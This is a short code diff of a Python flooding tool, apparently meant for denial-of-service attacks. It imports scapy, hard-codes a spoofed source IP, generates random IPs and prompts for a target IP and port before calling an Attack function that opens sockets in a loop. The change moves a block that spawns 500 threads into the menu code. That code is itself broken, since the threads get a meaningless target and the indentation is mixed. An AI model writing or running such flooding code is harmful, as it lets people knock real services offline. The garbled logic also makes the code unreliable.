@@ -7,6 +7,7 @@ import socket
 import threading
 import time
 from scapy.all import *
+from concurrent.futures import thread
 fake_ip = '44.197.175.168'
 attack_num = 0
 def Attack(target, port):
@@ -21,9 +22,7 @@ def Attack(target, port):
             print(attack_num)
             
             s.close()
-            for i in range(500):
-                thread = threading.Thread(target = 0)
-                thread.start()
+            
 def randomIP():
 	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
 	return ip
@@ -124,6 +123,9 @@ def main():
         target = str(input("Target IP: "))
         port = int(input("Target Port (80 suggested): "))
         Attack(target, port)
+	for i in range(500):
+                thread = threading.Thread(target = 0)
+                thread.start()
     elif option == 3:
         os.system("clear")
         print("  ______    ____       _____")
